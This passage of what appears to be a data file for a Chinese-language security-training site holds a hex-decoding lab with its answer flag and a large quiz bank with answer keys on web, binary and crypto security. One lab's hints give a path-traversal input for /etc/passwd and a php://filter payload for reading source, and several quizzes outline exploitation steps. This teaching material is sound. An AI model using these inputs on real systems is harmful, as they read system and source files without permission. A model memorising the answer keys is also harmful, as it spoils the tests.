      hints:["用 ../../../../etc/passwd 逐级跳出 Web 根目录","PHP 下可试 php://filter/convert.base64-encode/resource=config 读源码","防御：白名单文件名、禁用 PHP 包装器、关闭 allow_url_include"]
    },
    {
      id:"lab_hex", type:"decode", cat:"crypto", level:"入门", title:"密码学：十六进制解码",
      brief:"下面是一段十六进制编码的字符串（每两个字符表示一个字节），请解码出原始文本（即 flag）。",
      task:"把解码结果填到输入框并提交。",
      ciphertext:"5365635475746f727b6865785f6465636f64657d",
      answer:"SecTutor{hex_decode}",
      hints:["这是十六进制：53=S, 65=e, 63=c …","每两位一组转成对应 ASCII 字符即可","解码后是 SecTutor{...} 形式"]
    }
  ],
  /* ---------------- 随机自测题库（跨四领域 MCQ） ---------------- */
  quizzes: [
    { id:"q_sqli", cat:"web", level:"初级", q:"以下哪项最能从根本上防止 SQL 注入？",
      options:["对用户输入做字符串转义","使用参数化查询/预编译语句（占位符）","限制输入长度","把数据库放在内网"], answer:1,
      explain:"转义只是缓解且易漏；参数化查询让数据与指令分离，从根源阻断注入。" },
    { id:"q_xss", cat:"web", level:"初级", q:"防止存储型 XSS 的关键措施是？",
      options:["禁用 JavaScript","对输出做 HTML 编码 + 设置 CSP","只在公司内网访问","强制使用 HTTPS"], answer:1,
      explain:"核心是输出编码（按上下文转义）+ CSP 纵深防御；HTTPS 不解决 XSS。" },
    { id:"q_csrf", cat:"web", level:"中级", q:"防御 CSRF 攻击最有效的是？",
      options:["加图形验证码","使用 Anti-CSRF Token + SameSite Cookie","加密传输内容","限制来源 IP"], answer:1,
      explain:"Token 保证请求出自本人页面；SameSite=Strict/Lax 能挡跨站携带 Cookie。" },
    { id:"q_xxe", cat:"web", level:"中级", q:"XXE（XML 外部实体注入）的主要根因是？",
      options:["JSON 解析不当","XML 解析器启用了外部实体（ENTITY）解析","SQL 语句拼接","不安全的反序列化"], answer:1,
      explain:"禁掉 DOCTYPE/外部实体解析，或使用不解析 DTD 的安全解析器即可缓解。" },
    { id:"q_jwt", cat:"web", level:"中级", q:"某 JWT 库在验证时若攻击者把 alg 改成 none，可能？",
      options:["签名失效但无影响","绕过签名校验、伪造任意 payload","密钥直接泄露","会话立即过期"], answer:1,
      explain:"算法由客户端控制是致命缺陷；应固定服务端算法白名单并校验签名。" },
    { id:"q_stack", cat:"binary", level:"初级", q:"栈溢出漏洞利用的关键目标是覆盖？",
      options:["局部变量的值","函数的返回地址","全局变量","堆的元数据"], answer:1,
      explain:"覆盖返回地址可劫持控制流；配合 shellcode/ROP 实现代码执行。" },
    { id:"q_fmt", cat:"binary", level:"初级", q:"格式化字符串漏洞中，%n 能造成什么危害？",
      options:["读取栈上数据","向指定内存地址写入数据（可改返回地址/GS Cookie）","直接弹出命令行","拒绝服务攻击"], answer:1,
      explain:"%n 写入、%x/%s 读取；禁止用户控制格式串即可消除该漏洞。" },
    { id:"q_race", cat:"binary", level:"中级", q:"条件竞争（Race Condition）类漏洞常源于？",
      options:["口令强度过低","检查与使用之间的时序窗口（TOCTOU）","SQL 注入","跨站脚本"], answer:1,
      explain:"如先鉴权再操作，中间被并发请求插空；需用锁/原子操作/事务化。" },
    { id:"q_ecb", cat:"crypto", level:"初级", q:"哪种分组密码模式会暴露明文结构（相同明文块→相同密文块）？",
      options:["CBC","ECB","GCM","CTR"], answer:1,
      explain:"ECB 无随机化；应使用带 IV 的 CBC/GCM 等，并优先选 AEAD（GCM）。" },
    { id:"q_rng", cat:"crypto", level:"中级", q:"生成会话令牌应使用？",
      options:["rand() 取模","密码学安全随机数（CSPRNG，如 /dev/urandom）","以当前时间作种子","进程 ID"], answer:1,
      explain:"rand()/时间/pid 可预测；令牌必须来自 CSPRNG 且足够长。" },
    { id:"q_hash", cat:"crypto", level:"入门", q:"存储用户口令的正确做法是？",
      options:["明文存储","MD5 单次哈希","bcrypt/argon2 + 加盐","Base64 编码"], answer:2,
      explain:"慢哈希 + 每用户盐才能抗暴力/彩虹表；MD5/SHA 过快且无盐。" },
    { id:"q_oauth", cat:"pentest", level:"中级", q:"OAuth 授权码流程中，若 redirect_uri 未严格校验，攻击者可？",
      options:["直接提升权限","把授权码泄露到自己控制的回调地址进而兑换令牌","破解用户密码","绕过 MFA"], answer:1,
      explain:"应精确匹配白名单；同时校验 state 防 CSRF、用 PKCE 防授权码拦截。" },
    { id:"q_ssti", cat:"web", level:"中级", q:"把用户输入直接拼进模板字符串再渲染（如 render_template_string(user)），最可能导致？",
      options:["SQL 注入","服务端模板注入（SSTI），可执行表达式/读对象","跨站脚本","拒绝服务"], answer:1,
      explain:"用户输入被当作模板源码解析执行；应使用固定模板 + 参数传参，绝不拼接用户输入进模板。" },
    { id:"q_idor", cat:"web", level:"初级", q:"防御 IDOR（越权访问）的核心做法是？",
      options:["在前端隐藏 id 参数","服务端按当前登录用户校验资源归属，不信任客户端传入的 id","把 id 改成 UUID","限制请求频率"], answer:1,
      explain:"隐藏/改 UUID 只是增加难度；真正防线是服务端做归属校验（如 owner == current_user）。" },
    { id:"q_lfi", cat:"web", level:"初级", q:"缓解本地文件包含（LFI）最有效的做法是？",
      options:["过滤掉 ../ 字符串","文件名白名单 + 禁止 PHP 包装器/远程包含","把文件放到 Web 根目录","记录访问日志"], answer:1,
      explain:"字符串过滤易被变形绕过；白名单 + 关闭 allow_url_include 才是根本。" },
    { id:"q_blockmode", cat:"crypto", level:"初级", q:"以下哪种分组模式同时提供机密性与完整性（AEAD 认证加密）？",
      options:["ECB","CBC","GCM","CTR（无 MAC）"], answer:2,
      explain:"GCM 是 AEAD，内建完整性校验；ECB/CBC/CTR 仅提供机密性，需额外 MAC。" },
    { id:"q_osint", cat:"pentest", level:"入门", q:"下列属于「被动」开源情报（OSINT）收集的是？",
      options:["直接扫描目标端口","用 crt.sh 查询证书透明日志枚举子域名","对目标发起漏洞扫描","爆破后台登录"], answer:1,
      explain:"被动收集不接触目标（证书透明、whois、搜索缓存），降低被发现与封禁风险。" },

  // ===================== 扩充题库（庞大且多元）：Web / 二进制 / 密码学 / 渗透 =====================
  // ---- Web 安全 · 入门 ----
  { id:"xw1", cat:"web", level:"入门", q:"以下哪种做法最可能引入 SQL 注入？", options:["使用参数化查询","将用户输入直接拼接进 SQL 字符串","对输入做白名单校验","使用存储过程且参数绑定"], answer:1, explain:"拼接不可信输入到查询字符串是 SQL 注入的根因；参数化查询可从根本上阻断。" },
  { id:"xw2", cat:"web", level:"入门", q:"SQL 注入中，UNION 注入的主要目的是？", options:["删除数据库","把额外查询结果拼接到原结果集中回显","提升数据库权限","绕过登录"], answer:1, explain:"UNION SELECT 让攻击者把自定义查询的结果并入原页面响应，常用于拖库。" },
  { id:"xw3", cat:"web", level:"入门", q:"“盲注”（Blind SQLi）与常规注入的区别是？", options:["盲注无法利用","响应不直接回显数据，需靠布尔/时间差异推断","盲注只发生在 NoSQL","盲注不需要构造 payload"], answer:1, explain:"盲注时页面不返回数据本身，攻击者通过真假条件或睡眠延时来“问”数据库。" },
  { id:"xw4", cat:"web", level:"入门", q:"反射型 XSS 的传播方式是？", options:["存储在服务器数据库","通过链接/参数把恶意脚本“反射”到响应中诱用户点击","写入 cookie","仅在本地文件"], answer:1, explain:"反射型依赖把恶意脚本放进请求（如 URL），服务器原样返回到受害者浏览器执行。" },
  { id:"xw5", cat:"web", level:"入门", q:"存储型 XSS 与反射型 XSS 的主要区别？", options:["存储型把恶意脚本存到服务端，用户访问即触发","反射型更危险","存储型不执行","两者完全一样"], answer:0, explain:"存储型payload进入数据库/页面，任何访客都会被触发，影响面更大。" },
  { id:"xw6", cat:"web", level:"入门", q:"DOM 型 XSS 的源头通常在？", options:["服务端模板拼接","客户端 JS 读取不可信来源(location.hash/document.URL)并写入 DOM","数据库存储","HTTP 头"], answer:1, explain:"DOM XSS 完全发生在客户端，服务端未输出恶意脚本，而是由前端 JS 不安全地操作 DOM 造成。" },
  { id:"xw7", cat:"web", level:"入门", q:"为降低 XSS 影响，敏感 cookie 应设置？", options:["HttpOnly","仅 Secure 即可","SameSite=None","Path=/"], answer:0, explain:"HttpOnly 禁止 JS 读取该 cookie，可阻止 XSS 偷会话。" },
  { id:"xw8", cat:"web", level:"入门", q:"CSP（内容安全策略）主要用于？", options:["加速页面","限制可加载/执行的资源来源，缓解 XSS 与数据注入","加密传输","防 CSRF"], answer:1, explain:"CSP 通过白名单约束脚本/资源来源，是重要的 XSS 纵深防御手段。" },
  { id:"xw9", cat:"web", level:"入门", q:"CSRF 攻击成功依赖浏览器的哪项行为？", options:["自动执行 JS","自动携带目标站 cookie 发起跨站请求","同源策略","CORS 预检"], answer:1, explain:"浏览器会自动附带目标站 cookie，使受害者在不知情时以自己身份发请求。" },
  { id:"xw10", cat:"web", level:"入门", q:"防御 CSRF 最有效组合是？", options:["图形验证码 + 短信","Anti-CSRF Token + SameSite Cookie","禁用 JS","更换 IP"], answer:1, explain:"Token 保证请求出自本人页面，SameSite 限制跨站携带 cookie，二者叠加更稳。" },
  { id:"xw11", cat:"web", level:"入门", q:"SameSite=Strict 对 Cookie 的影响是？", options:["任何请求都带","跨站请求不携带该 Cookie","仅 HTTPS 带","永不失效"], answer:1, explain:"Strict 最严格：只要请求发起方与目标站不同站，就不带该 cookie。" },
  { id:"xw12", cat:"web", level:"入门", q:"XXE 漏洞根因是？", options:["JSON 解析","XML 解析器允许解析外部实体(DTD/ENTITY)","HTML 编码","SQL 拼接"], answer:1, explain:"启用外部实体解析后，攻击者可读取文件或发起 SSRF。" },
  { id:"xw13", cat:"web", level:"入门", q:"XXE 常被用来做 SSRF，典型是？", options:["读取本地文件 file:// 或访问内网","修改 DNS","提升权限","删除日志"], answer:0, explain:"外部实体可指向 file:// 或内网地址，从而读文件或访问内部服务。" },
  { id:"xw14", cat:"web", level:"入门", q:"SSRF（服务端请求伪造）的防御核心是？", options:["禁用 HTTPS","对目标地址做白名单/禁止访问内网与云元数据","增大超时","启用 gzip"], answer:1, explain:"SSRF 是服务器代发请求，必须约束目标地址，禁止内网与云元数据地址。" },
  { id:"xw15", cat:"web", level:"入门", q:"云环境 SSRF 常试图访问哪个地址读取实例元数据/临时凭证？", options:["8.8.8.8","169.254.169.254","127.0.0.1:80","example.com"], answer:1, explain:"169.254.169.254 是云实例的链路本地元数据服务，常含临时凭证，是 SSRF 的高价值目标。" },
  { id:"xw16", cat:"web", level:"入门", q:"文件上传漏洞防御不包括？", options:["校验文件类型与内容","限制执行权限(存到非可执行目录)","信任客户端文件名","重命名随机化"], answer:2, explain:"客户端文件名完全可控，绝不能信任；应服务端校验类型/内容并随机命名。" },
  { id:"xw17", cat:"web", level:"入门", q:"路径遍历(../)利用目的是？", options:["提升网速","跳出 Web 根目录读取/执行任意文件","注入 SQL","绕过 CSP"], answer:1, explain:"../ 序列可回溯目录，读取或包含本不应暴露的文件。" },
  { id:"xw18", cat:"web", level:"入门", q:"开放重定向(open redirect)常用于？", options:["提权","钓鱼跳转窃取凭证/令牌","SQL 注入","XSS"], answer:1, explain:"开放重定向常被放进钓鱼链接，诱使用户以为在访问可信站点。" },
  { id:"xw19", cat:"web", level:"入门", q:"点击劫持(clickjacking)防御用？", options:["X-Frame-Options / CSP frame-ancestors 禁止被 iframe 嵌套","CORS","HttpOnly","HSTS"], answer:0, explain:"阻止站点被嵌入恶意 iframe，可防用户误点隐藏按钮。" },
  { id:"xw20", cat:"web", level:"入门", q:"HSTS 的作用是？", options:["强制 HTTPS、防 SSL 剥离/降级","防 XSS","防 CSRF","加密 cookie"], answer:0, explain:"HSTS 让浏览器只走 HTTPS，缓解降级与 SSL stripping。" },
  // ---- Web 安全 · 初级 ----
  { id:"xw21", cat:"web", level:"初级", q:"命令注入(OS command injection)防御应优先？", options:["转义所有字符","避免调用 shell、用参数数组/白名单","加长超时","禁用网络"], answer:1, explain:"最佳是根本不拼 shell；必须调用时用参数数组且白名单校验。" },
  { id:"xw22", cat:"web", level:"初级", q:"NoSQL 注入(如 MongoDB)常利用？", options:["union","操作符如 $ne/$gt 改变查询逻辑(绕过认证)","order by","limit"], answer:1, explain:"把输入变成查询操作符对象，可构造恒真条件绕过登录等逻辑。" },
  { id:"xw23", cat:"web", level:"初级", q:"二阶(Second-Order)注入指？", options:["两次扫描","恶意数据先被存储、后续在另一处被拼入命令/查询执行","二级缓存","两阶段认证"], answer:1, explain:"数据先“安全”入库，之后在另一处被取出拼入上下文才触发，易被忽略。" },
  { id:"xw24", cat:"web", level:"初级", q:"报错注入利用？", options:["数据库报错信息回显数据","cookie","HTTP 头","CSS"], answer:0, explain:"利用数据库报错把内部数据带回页面，是信息回显型注入。" },
  { id:"xw25", cat:"web", level:"初级", q:"功能级越权(BFLA)例子？", options:["改 URL 里的 id","修改 role/admin 参数调用本无权用的管理接口","改密码","改邮箱"], answer:1, explain:"BFLA 是横向/纵向的功能越权，如普通用户改参数调用管理员接口。" },
  { id:"xw26", cat:"web", level:"初级", q:"会话固定(session fixation)指？", options:["会话随机生成","攻击者先种入已知 session id 诱用户使用，从而冒充","会话加密","会话过期"], answer:1, explain:"攻击者预先设定会话标识并诱使受害者使用，登录后攻击者即可凭该 id 冒充。" },
  { id:"xw27", cat:"web", level:"初级", q:"Cookie 的 Secure 属性表示？", options:["仅 HTTPS 传输","仅同源","不可读","永不过期"], answer:0, explain:"Secure 要求 cookie 只能通过 HTTPS 发送，降低明文泄露风险。" },
  { id:"xw28", cat:"web", level:"初级", q:"Cookie 的 SameSite 属性用于？", options:["控制跨站请求是否携带","加密","压缩","存储大小"], answer:0, explain:"SameSite 决定跨站请求是否附带该 cookie，是防御 CSRF 的重要手段。" },
  { id:"xw29", cat:"web", level:"初级", q:"JWT 弱密钥/共享密钥可被？", options:["压缩","离线爆破(字典)伪造令牌","DNS 污染","CSRF"], answer:1, explain:"HS256 用对称密钥，若密钥弱可被字典爆破，从而伪造任意身份令牌。" },
  { id:"xw30", cat:"web", level:"初级", q:"JWT 的 kid 参数若未校验可被用于？", options:["路径遍历/SQL 注入来定位签名密钥","加速","压缩","加密"], answer:0, explain:"kid 指向密钥文件/数据库，未校验时可借路径遍历或注入篡改验签所用的密钥。" },
  { id:"xw31", cat:"web", level:"初级", q:"CORS 设置 Access-Control-Allow-Origin: * 且带凭据时？", options:["允许任意源带凭据","浏览器不允许 * 与凭据同时使用，需显式源","提升性能","防 XSS"], answer:1, explain:"带凭据时不能用通配符，必须返回具体的请求源，否则浏览器拒绝。" },
  { id:"xw32", cat:"web", level:"初级", q:"反射 Origin 到 CORS 头(任意源)会导致？", options:["性能提升","跨源读取本应受限的资源(信息泄露)","防 CSRF","加密"], answer:1, explain:"把请求者 Origin 原样回显等于对任意源开放，敏感接口会被跨站读取。" },
  { id:"xw33", cat:"web", level:"初级", q:"子资源完整性(SRI)用途？", options:["校验第三方资源哈希防被篡改","加速","压缩","加密 cookie"], answer:0, explain:"SRI 用哈希校验 CDN 脚本/样式是否被替换，防止供应链投毒。" },
  { id:"xw34", cat:"web", level:"初级", q:"同源策略(SOP)主要限制？", options:["跨源读取资源","同站脚本","本地存储","cookie 大小"], answer:0, explain:"SOP 限制网页跨源读取响应，CORS 是在其之上的受控放宽。" },
  { id:"xw35", cat:"web", level:"初级", q:"GraphQL 常见风险包括？", options:["内省暴露 schema、深度/批查询导致 DoS","SQL 注入","XSS","CSRF"], answer:0, explain:"默认内省暴露全量 schema，且嵌套/批量查询可被用于资源耗尽型 DoS。" },
  { id:"xw36", cat:"web", level:"初级", q:"RFI(远程文件包含)与 LFI 区别？", options:["RFI 可加载远程攻击者控制的文件并执行","LFI 只读取","RFI 更安全","无区别"], answer:0, explain:"RFI 把远程恶意文件包含进来执行，危害更大；LFI 通常只能读本地文件。" },
  // ---- Web 安全 · 中级 ----
  { id:"xw37", cat:"web", level:"中级", q:"HTTP 请求走私(CL/TE)利用？", options:["前后端对 Content-Length/Transfer-Encoding 解析不一致造成请求拼接","DNS","CSRF","XSS"], answer:0, explain:"前后端解析差异可把两个请求“粘”在一起，绕过安全控制或污染他人请求。" },
  { id:"xw38", cat:"web", level:"中级", q:"HTTP 响应拆分(CRLF 注入)可造成？", options:["缓存投毒/头注入/ XSS","提速","压缩","加密"], answer:0, explain:"注入 CRLF 可在响应中插入额外头或拆分响应，进而 XSS/缓存投毒。" },
  { id:"xw39", cat:"web", level:"中级", q:"主机头注入(Host header)常用于？", options:["密码重置链接中毒/缓存投毒","XSS","CSRF","SQLi"], answer:0, explain:"服务端若用 Host 头拼重置链接，攻击者可令受害者收到指向恶意域的链接。" },
  { id:"xw40", cat:"web", level:"中级", q:"凭证填充(credential stuffing)防御？", options:["设备指纹/限速/2FA/异常检测","只用密码","明文存储","关闭 HTTPS"], answer:0, explain:"用已泄露账密批量尝试登录，需用设备/行为特征、限速与 2FA 对抗。" },
  { id:"xw41", cat:"web", level:"中级", q:"缓存投毒(cache poisoning)依赖？", options:["未规范化的输入被用作缓存键 + 未校验的响应","HTTPS","CSRF","XSS"], answer:0, explain:"若不可信输入进入缓存键且响应未校验，攻击者可让缓存向其他用户返回恶意内容。" },
  { id:"xw42", cat:"web", level:"中级", q:"CSP 中 nonce/hash 的作用是？", options:["允许特定内联脚本执行同时保留策略","禁用 JS","加密","加速"], answer:0, explain:"nonce/hash 让受信内联脚本可运行，同时仍禁止其他内联脚本，兼顾功能与安全。" },
  { id:"xw43", cat:"web", level:"中级", q:"防 XSS 的“输出编码”应按？", options:["统一转义","按输出上下文(HTML/JS/URL/属性)分别编码","只转义 <","只转义引号"], answer:1, explain:"不同上下文需不同编码规则，错误上下文编码会漏防或被绕过。" },
  { id:"xw44", cat:"web", level:"中级", q:"OAuth 授权码流程用 PKCE 主要防止？", options:["授权码拦截后被人拿去兑换令牌","CSRF","XSS","暴力破解密码"], answer:0, explain:"PKCE 用一次性挑战值绑定授权码与请求方，防止授权码被截获冒用。" },
  { id:"xw45", cat:"web", level:"中级", q:"刷新令牌(refresh token)泄露后果？", options:["仅影响本次会话","攻击者可长期获取新访问令牌","无影响","仅泄露用户名"], answer:1, explain:"刷新令牌有效期长，泄露意味着持续可用，应妥善存储并支持吊销。" },
  // ---- 二进制 · 入门 ----
  { id:"xb1", cat:"binary", level:"入门", q:"栈溢出的根本原因是？", options:["缺少边界检查写入超出缓冲区","编译器错误","CPU 故障","网络延迟"], answer:0, explain:"向定长缓冲区写入超过其容量的数据会覆盖相邻栈内容（含返回地址）。" },
  { id:"xb2", cat:"binary", level:"入门", q:"格式化字符串漏洞中 %x 用于？", options:["写入","读取栈上数据(泄露)","执行","删除"], answer:1, explain:"%x 按格式从栈上取并打印数据，可泄露栈内存；%n 才可写入。" },
  { id:"xb3", cat:"binary", level:"入门", q:"NX/DEP 的作用是？", options:["数据页不可执行，阻止在堆/栈执行 shellcode","随机化地址","加密","限速"], answer:0, explain:"NX 让数据区域不可执行，使传统“写 shellcode 再跳过去”失效，催生 ROP。" },
  { id:"xb4", cat:"binary", level:"入门", q:"ASLR 的作用是？", options:["随机化内存地址布局，增加预测难度","禁用执行","加密","压缩"], answer:0, explain:"每次加载基址随机，攻击者在无信息泄露时难以预测函数/库地址。" },
  { id:"xb5", cat:"binary", level:"入门", q:"栈 Canary 的作用是？", options:["检测栈溢出是否覆盖了返回地址(哨兵值)","加速","加密","压缩"], answer:0, explain:"在返回地址前放随机哨兵，函数返回前检查被改则中止，防返回地址被覆盖。" },
  { id:"xb6", cat:"binary", level:"入门", q:"PIE 指？", options:["代码基址随机化(位置无关可执行)","数据加密","禁用执行","堆随机"], answer:0, explain:"PIE 让代码段基址也随机化，与 ASLR 配合提升利用难度。" },
  { id:"xb7", cat:"binary", level:"入门", q:"RELRO(FULL)的作用是？", options:["使 GOT 重定位后只读，防 GOT 覆盖","加密","随机化","压缩"], answer:0, explain:"FULL RELRO 在启动时完成重定位并把 GOT 设为只读，阻止改写函数指针。" },
  { id:"xb8", cat:"binary", level:"入门", q:"条件竞争(TOCTOU)常见在？", options:["检查与使用之间的时间窗口","网络","加密","编译"], answer:0, explain:"先检查权限/状态，再使用时已被另一线程改变，造成越权或绕过。" },
  // ---- 二进制 · 初级 ----
  { id:"xb9", cat:"binary", level:"初级", q:"堆溢出常覆写？", options:["堆块元数据(size/fd/bk)实现任意写","栈返回地址","寄存器","内核"], answer:0, explain:"堆块头含 size 与前后向指针，覆写它们可制造任意地址写，是堆利用核心。" },
  { id:"xb10", cat:"binary", level:"初级", q:"Use-After-Free(UAF)指？", options:["释放后未置空又被使用，可能复用已分配块","未分配","重复分配","内存泄漏"], answer:0, explain:"释放后指针未清空，再次使用可能操作被重新分配的同块内存，造成类型混淆/劫持。" },
  { id:"xb11", cat:"binary", level:"初级", q:"double free 指？", options:["多次 free 同一指针，破坏堆结构","一次 free","未 free","栈溢出"], answer:0, explain:"重复释放同一块会让空闲链表出现重复节点，进而可被用于任意写。" },
  { id:"xb12", cat:"binary", level:"初级", q:"ROP(返回导向编程)用于绕过？", options:["NX:复用已存在代码片段(gadget)拼出逻辑","ASLR","Canary","PIE"], answer:0, explain:"NX 下不能执行注入代码，ROP 改借程序中已有的 ret 结尾小片段串起攻击逻辑。" },
  { id:"xb13", cat:"binary", level:"初级", q:"ret2libc 通常调用？", options:["system(\"/bin/sh\") 等 libc 函数拿 shell","printf","exit","main"], answer:0, explain:"在禁用执行的环境下，跳到 libc 的 system 并布置 /bin/sh 参数即可得 shell。" },
  { id:"xb14", cat:"binary", level:"初级", q:"GOT 覆盖利用前提是？", options:["GOT 可写(非 FULL RELRO)时改写函数指针劫持控制流","ASLR","Canary","PIE"], answer:0, explain:"部分 RELRO 下 GOT 仍可写，覆写某函数项即可在调用它时跳到攻击者地址。" },
  { id:"xb15", cat:"binary", level:"初级", q:"整数溢出可能导致？", options:["分配大小计算错误进而堆溢出/越界","网络慢","编译错误","加密弱"], answer:0, explain:"长度运算环绕为小值，使分配偏小，后续拷贝越界写坏堆元数据。" },
  { id:"xb16", cat:"binary", level:"初级", q:"off-by-one 是？", options:["边界差一写入导致单字节越界","整块越界","未初始化","空指针"], answer:0, explain:"差一错误常只越界一字节，却足以改相邻堆块的 size 或 Canary 低位。" },
  { id:"xb17", cat:"binary", level:"初级", q:"shellcode 要成功执行通常需要？", options:["可写且可执行的页(NX 下更难)","仅可写","仅可读","仅网络"], answer:0, explain:"NX 下数据页不可执行，需配合内存权限修改或 ROP 才能运行注入代码。" },
  { id:"xb18", cat:"binary", level:"初级", q:"NOP sled 的作用是？", options:["增大命中 shellcode 入口的容错区间","加密","压缩","加速"], answer:0, explain:"一串 NOP 让跳转落在其任意位置都能滑到真正的 shellcode，降低定位精度要求。" },
  // ---- 二进制 · 中级 ----
  { id:"xb19", cat:"binary", level:"中级", q:"checksec 工具可查看？", options:["Canary/NX/PIE/RELRO 等保护","网络","日志","密码"], answer:0, explain:"checksec 汇总二进制开启的缓解措施，是漏洞利用前的第一步侦察。" },
  { id:"xb20", cat:"binary", level:"中级", q:"ROP 中 gadget 指？", options:["以 ret 结尾的短指令序列，用于拼装逻辑","漏洞","shellcode","堆块"], answer:0, explain:"gadget 是程序中已有的小指令段，多个串联即可在不写可执行代码的前提下完成攻击。" },
  { id:"xb21", cat:"binary", level:"中级", q:"seccomp 是？", options:["限制进程可用 syscall 的系统过滤器(沙箱)","加密","随机化","压缩"], answer:0, explain:"seccomp 收窄进程系统调用面，即使被攻破也难做敏感操作，是沙箱基础。" },
  { id:"xb22", cat:"binary", level:"中级", q:"glibc tcache 因是单链表，使得？", options:["UAF/double free 更易被利用","更慢","更安全","加密"], answer:0, explain:"tcache 缺少充分的一致性校验，UAF/double free 在它上面更易转化为任意写。" },
  { id:"xb23", cat:"binary", level:"中级", q:"栈溢出利用需要先确定？", options:["返回地址相对缓冲区的偏移(offset)","网络端口","密码","文件名"], answer:0, explain:"只有知道从缓冲区到返回地址的填充长度，才能精确覆盖返回地址跳到目标。" },
  { id:"xb24", cat:"binary", level:"中级", q:"信息泄露(如泄露 libc 地址)对 ROP 的意义？", options:["可计算基址绕过 ASLR 调用 gadget","无意义","加速网络","加密"], answer:0, explain:"ASLR 随机化基址，泄露一个 libc 地址就能算出 system 等函数真实地址。" },
  { id:"xb25", cat:"binary", level:"中级", q:"类型混淆(type confusion)常导致？", options:["把对象当另一类型解释，造成越界/UAF 类利用","编译错误","网络","加密"], answer:0, explain:"类型信息被破坏后，对同一块内存按错误结构解读，可越界读写或触发 UAF。" },
  { id:"xb26", cat:"binary", level:"中级", q:"fastbin dup 是？", options:["堆利用技术：利用 double free 在 fastbin 制造重复块","网络","加密","编译"], answer:0, explain:"借助 fastbin 的重复释放制造两个指向同块的指针，进而控制空闲链表。" },
  { id:"xb27", cat:"binary", level:"中级", q:"unlink 是？", options:["经典堆利用：通过伪造 chunk 元数据在空闲时写任意地址","XSS","CSRF","SQLi"], answer:0, explain:"unlink 合并相邻空闲块时会写相邻指针，伪造元数据即可任意地址写。" },
  { id:"xb28", cat:"binary", level:"中级", q:"栈 canary 若被泄露(如格式化字符串)会？", options:["失效，溢出可不被发现","更安全","加密","加速"], answer:0, explain:"canary 一旦被读出，攻击者可在溢出时原样填回，使检测失效。" },
  // ---- 密码学 · 入门 ----
  { id:"xc1", cat:"crypto", level:"入门", q:"DES 的主要缺陷？", options:["56 位密钥过短，已被 brute-force","太快","分组太大","需要 IV"], answer:0, explain:"DES 仅 56 位密钥，现代算力可穷举，已不安全的。" },
  { id:"xc2", cat:"crypto", level:"入门", q:"3DES 现状？", options:["有效 112 位、慢、新系统不推荐","最安全","无需密钥","无 IV"], answer:0, explain:"3DES 有效强度约 112 位且性能差，NIST 已逐步弃用，新系统用 AES。" },
  { id:"xc3", cat:"crypto", level:"入门", q:"AES 支持的分组长度是？", options:["128 位","64 位","256 位(仅)","512 位"], answer:0, explain:"AES 固定 128 位分组；密钥才分 128/192/256。" },
  { id:"xc4", cat:"crypto", level:"入门", q:"AES 密钥长度可选？", options:["128/192/256 位","仅 128","仅 56","仅 64"], answer:0, explain:"AES 支持三种密钥长度，均为安全强度足够的选项。" },
  { id:"xc5", cat:"crypto", level:"入门", q:"MD5 现况？", options:["已被攻破(可造碰撞)，不用于安全签名/校验","仍安全","最快","需密钥"], answer:0, explain:"MD5 碰撞已可 practical 构造，不能用于数字签名等安全场景。" },
  { id:"xc6", cat:"crypto", level:"入门", q:"SHA-1 现况？", options:["已可构造碰撞，弃用","最安全","需 IV","对称"], answer:0, explain:"SHA-1 碰撞已被证实，证书与签名场景应升级到 SHA-256 及以上。" },
  { id:"xc7", cat:"crypto", level:"入门", q:"数字签名用？", options:["私钥签名、公钥验证","对称密钥","哈希即可","无密钥"], answer:0, explain:"签名由私钥产生、公钥验证，提供来源认证与不可否认。" },
  { id:"xc8", cat:"crypto", level:"入门", q:"MAC 与数字签名区别在于？", options:["MAC 基于对称密钥、双方共享；签名用非对称且可公开验证","无区别","MAC 用公钥","签名用对称"], answer:0, explain:"MAC 的验证方也持有同一密钥，无法向第三方证明；签名可公开验证。" },
  { id:"xc9", cat:"crypto", level:"入门", q:"口令存储应加 salt 是为了？", options:["防彩虹表、使相同口令密文不同","加速","缩短","加密传输"], answer:0, explain:"随机 salt 让相同口令产生不同哈希，并使预计算彩虹表失效。" },
  { id:"xc10", cat:"crypto", level:"入门", q:"存储口令推荐？", options:["bcrypt/Argon2/scrypt 等慢哈希+盐","MD5 单次","明文","Base64"], answer:0, explain:"慢哈希拖慢暴力/字典攻击，加盐防彩虹表，是当前最佳实践。" },
  { id:"xc11", cat:"crypto", level:"入门", q:"生成令牌/密钥应使用？", options:["CSPRNG(如 /dev/urandom)","rand()","时间种子","PID"], answer:0, explain:"密码学安全随机数不可预测，rand()/时间/pid 都可被猜解。" },
  // ---- 密码学 · 初级 ----
  { id:"xc12", cat:"crypto", level:"初级", q:"ECB 模式问题？", options:["相同明文块→相同密文块，泄露结构","需 IV","最快","最安全"], answer:0, explain:"ECB 无随机化，相同明文块产生相同密文块，会暴露图像/数据模式。" },
  { id:"xc13", cat:"crypto", level:"初级", q:"CBC 模式 IV 应？", options:["随机且不可预测","固定为 0","公开明文","省略"], answer:0, explain:"IV 必须随机不可预测，否则相同明文首块会暴露关联。" },
  { id:"xc14", cat:"crypto", level:"初级", q:"CBC 填充预言(padding oracle)可？", options:["通过填充校验差异解密密文","提速","压缩","加密"], answer:0, explain:"若服务对填充错误返回不同响应，攻击者可逐字节恢复明文，无需密钥。" },
  { id:"xc15", cat:"crypto", level:"初级", q:"CTR/GCM 的 nonce 绝对不能重用，否则？", options:["可恢复明文甚至伪造(灾难性)","无影响","更安全","加速"], answer:0, explain:"流密码式 nonce 重用会让同一密钥流异或，直接泄露明文并可伪造。" },
  { id:"xc16", cat:"crypto", level:"初级", q:"RC4 现状？", options:["存在统计偏置，已不安全","最安全","需 IV","对称最好"], answer:0, explain:"RC4 密钥流有可 exploited 的偏置，已被淘汰，不应再使用。" },
  { id:"xc17", cat:"crypto", level:"初级", q:"RSA 小公钥指数 e=3 且仅用裸加密小消息会被？", options:["直接开立方根恢复明文(需适当填充)","提速","压缩","加密"], answer:0, explain:"小 e 且无填充时，密文可能本身就是明文的小幂次，开根即得明文。" },
  { id:"xc18", cat:"crypto", level:"初级", q:"RSA 应使用哪种填充？", options:["OAEP(PKCS#1 v2)","无填充(Textbook)","PKCS#1 v1.5(易 BLEICHEN)","自定义 XOR"], answer:0, explain:"OAEP 提供语义安全；v1.5 有 BLEICHEN 等攻击，教科书式无填充更危险。" },
  { id:"xc19", cat:"crypto", level:"初级", q:"两 RSA 模数共享一个素因子时，可？", options:["求 GCD 分解两模数","提速","压缩","加密"], answer:0, explain:"共享一个素数则两模数 GCD 即该素数，进而分解出私钥。" },
